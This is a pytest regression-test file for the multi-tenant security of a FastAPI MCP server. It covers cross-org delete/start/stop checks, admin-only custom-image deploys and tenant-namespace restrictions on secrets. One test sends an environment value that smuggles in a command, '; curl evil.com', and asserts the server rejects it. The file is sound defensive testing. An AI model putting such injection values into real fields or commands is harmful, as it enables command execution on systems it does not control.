"""BACKLOG C6 / H12 / D5 regression tests — MCP route security.

Verifies the three multi-tenant auth gaps that were gating external
exposure of the MCP server:

- **C6**: DELETE /v1/stronghold/mcp/servers/{name} must enforce org match
- **H12**: POST .../stop and .../start must enforce org match
- **D5**:  custom-image deploy must require admin role + env allowlist +
           secret-ref tenant-namespace restriction
"""

from __future__ import annotations

from typing import Any

import pytest
from fastapi import FastAPI
from fastapi.testclient import TestClient

from stronghold.api.routes.mcp import router as mcp_router
from stronghold.mcp.registry import MCPRegistry
from stronghold.mcp.types import MCPServerSpec
from stronghold.types.auth import AuthContext
from tests.fakes import FakeAuthProvider


def _auth(org: str, *, roles: frozenset[str] = frozenset({"engineer"})) -> FakeAuthProvider:
    return FakeAuthProvider(
        AuthContext(
            user_id=f"user@{org}",
            org_id=org,
            team_id="default",
            roles=roles,
        ),
    )


class _Container:
    def __init__(
        self,
        *,
        auth_provider: Any,
        mcp_registry: MCPRegistry,
    ) -> None:
        self.auth_provider = auth_provider
        self.mcp_registry = mcp_registry
        self.mcp_deployer = None
        self.warden = None


def _app(container: _Container) -> FastAPI:
    app = FastAPI()
    app.include_router(mcp_router)
    app.state.container = container
    return app


def _register_server(registry: MCPRegistry, *, name: str, org_id: str) -> None:
    spec = MCPServerSpec(
        name=name,
        image="ghcr.io/modelcontextprotocol/test:latest",
        port=3000,
        trust_tier="t3",
    )
    registry.register(spec, org_id=org_id)


def _csrf_headers() -> dict[str, str]:
    return {
        "Authorization": "Bearer sk-test",
        "x-csrf-token": "ignored",
        "origin": "https://example.invalid",
    }


# ── C6: DELETE cross-org returns 403 ─────────────────────────────────


def test_c6_delete_cross_org_returns_403() -> None:
    registry = MCPRegistry()
    _register_server(registry, name="victim-mcp", org_id="other-org")
    container = _Container(auth_provider=_auth("my-org"), mcp_registry=registry)
    client = TestClient(_app(container))

    resp = client.delete("/v1/stronghold/mcp/servers/victim-mcp", headers=_csrf_headers())

    assert resp.status_code == 403
    assert "another org" in resp.json().get("detail", "")
    # Ensure the server was NOT removed
    assert registry.get("victim-mcp") is not None


def test_c6_delete_same_org_allowed() -> None:
    registry = MCPRegistry()
    _register_server(registry, name="own-mcp", org_id="my-org")
    container = _Container(auth_provider=_auth("my-org"), mcp_registry=registry)
    client = TestClient(_app(container))

    resp = client.delete("/v1/stronghold/mcp/servers/own-mcp", headers=_csrf_headers())

    assert resp.status_code == 200


def test_c6_delete_global_server_requires_super_admin() -> None:
    registry = MCPRegistry()
    _register_server(registry, name="global-mcp", org_id="")
    container = _Container(auth_provider=_auth("my-org"), mcp_registry=registry)
    client = TestClient(_app(container))

    resp = client.delete("/v1/stronghold/mcp/servers/global-mcp", headers=_csrf_headers())

    assert resp.status_code == 403
    assert "super_admin" in resp.json().get("detail", "")


# ── H12: start/stop cross-org returns 403 ────────────────────────────


@pytest.mark.parametrize("verb", ["start", "stop"])
def test_h12_start_stop_cross_org_returns_403(verb: str) -> None:
    registry = MCPRegistry()
    _register_server(registry, name="victim-mcp", org_id="other-org")
    container = _Container(auth_provider=_auth("my-org"), mcp_registry=registry)
    client = TestClient(_app(container))

    resp = client.post(f"/v1/stronghold/mcp/servers/victim-mcp/{verb}", headers=_csrf_headers())

    assert resp.status_code == 403


@pytest.mark.parametrize("verb", ["start", "stop"])
def test_h12_start_stop_same_org_allowed(verb: str) -> None:
    registry = MCPRegistry()
    _register_server(registry, name="own-mcp", org_id="my-org")
    container = _Container(auth_provider=_auth("my-org"), mcp_registry=registry)
    client = TestClient(_app(container))

    resp = client.post(f"/v1/stronghold/mcp/servers/own-mcp/{verb}", headers=_csrf_headers())

    assert resp.status_code == 200


# ── D5: custom-image deploy requires admin ──────────────────────────


def test_d5_custom_image_deploy_requires_admin() -> None:
    registry = MCPRegistry()
    container = _Container(auth_provider=_auth("my-org"), mcp_registry=registry)
    client = TestClient(_app(container))

    resp = client.post(
        "/v1/stronghold/mcp/servers",
        json={
            "name": "custom-mcp",
            "image": "ghcr.io/modelcontextprotocol/custom:latest",
        },
        headers=_csrf_headers(),
    )

    assert resp.status_code == 403
    assert "admin role" in resp.json().get("detail", "")


def test_d5_custom_image_deploy_allowed_for_admin() -> None:
    registry = MCPRegistry()
    container = _Container(
        auth_provider=_auth("my-org", roles=frozenset({"admin"})),
        mcp_registry=registry,
    )
    client = TestClient(_app(container))

    resp = client.post(
        "/v1/stronghold/mcp/servers",
        json={
            "name": "custom-mcp",
            "image": "ghcr.io/modelcontextprotocol/custom:latest",
        },
        headers=_csrf_headers(),
    )

    assert resp.status_code == 201


def test_d5_env_var_with_metachar_rejected() -> None:
    registry = MCPRegistry()
    container = _Container(
        auth_provider=_auth("my-org", roles=frozenset({"admin"})),
        mcp_registry=registry,
    )
    client = TestClient(_app(container))

    resp = client.post(
        "/v1/stronghold/mcp/servers",
        json={
            "name": "custom-mcp",
            "image": "ghcr.io/modelcontextprotocol/custom:latest",
            "env": {"MALICIOUS": "; curl evil.com"},
        },
        headers=_csrf_headers(),
    )

    assert resp.status_code == 400
    assert "metacharacter" in resp.json().get("detail", "")


def test_d5_env_key_non_alphanumeric_rejected() -> None:
    registry = MCPRegistry()
    container = _Container(
        auth_provider=_auth("my-org", roles=frozenset({"admin"})),
        mcp_registry=registry,
    )
    client = TestClient(_app(container))

    resp = client.post(
        "/v1/stronghold/mcp/servers",
        json={
            "name": "custom-mcp",
            "image": "ghcr.io/modelcontextprotocol/custom:latest",
            "env": {"bad key": "value"},
        },
        headers=_csrf_headers(),
    )

    assert resp.status_code == 400


def test_d5_secret_outside_tenant_namespace_rejected() -> None:
    registry = MCPRegistry()
    container = _Container(
        auth_provider=_auth("my-org", roles=frozenset({"admin"})),
        mcp_registry=registry,
    )
    client = TestClient(_app(container))

    resp = client.post(
        "/v1/stronghold/mcp/servers",
        json={
            "name": "custom-mcp",
            "image": "ghcr.io/modelcontextprotocol/custom:latest",
            "secrets": {"API_KEY": "other-org-secret:key"},
        },
        headers=_csrf_headers(),
    )

    assert resp.status_code == 403
    assert "tenant namespace" in resp.json().get("detail", "")


def test_d5_secret_in_tenant_namespace_accepted() -> None:
    registry = MCPRegistry()
    container = _Container(
        auth_provider=_auth("my-org", roles=frozenset({"admin"})),
        mcp_registry=registry,
    )
    client = TestClient(_app(container))

    resp = client.post(
        "/v1/stronghold/mcp/servers",
        json={
            "name": "custom-mcp",
            "image": "ghcr.io/modelcontextprotocol/custom:latest",
            "secrets": {"API_KEY": "stronghold-my-org-creds:key"},
        },
        headers=_csrf_headers(),
    )

    assert resp.status_code == 201


def test_d5_super_admin_can_reference_shared_secret() -> None:
    registry = MCPRegistry()
    container = _Container(
        auth_provider=_auth("my-org", roles=frozenset({"super_admin"})),
        mcp_registry=registry,
    )
    client = TestClient(_app(container))

    resp = client.post(
        "/v1/stronghold/mcp/servers",
        json={
            "name": "shared-mcp",
            "image": "ghcr.io/modelcontextprotocol/custom:latest",
            "secrets": {"SHARED": "stronghold-shared-telemetry:token"},
        },
        headers=_csrf_headers(),
    )

    assert resp.status_code == 201
